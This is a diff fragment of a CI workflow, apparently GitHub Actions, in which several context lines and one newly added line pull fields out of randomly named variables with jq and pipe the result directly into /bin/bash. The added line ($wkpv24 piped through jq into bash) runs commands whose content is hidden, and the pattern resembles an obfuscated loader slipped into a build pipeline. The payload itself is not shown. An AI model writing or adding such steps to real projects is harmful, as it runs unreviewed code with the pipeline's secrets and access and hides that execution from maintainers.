@@ -29,6 +29,7 @@ jobs:
           echo $j3 | jq -r .s73246 | /bin/bash
           printf '%s' "$zhlpl300" | jq -r .sbpep2 | /bin/bash
           printf '%s' "$er83299" | jq -r .tub2 | /bin/bash
+          echo $wkpv24 | jq -r .r8207 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
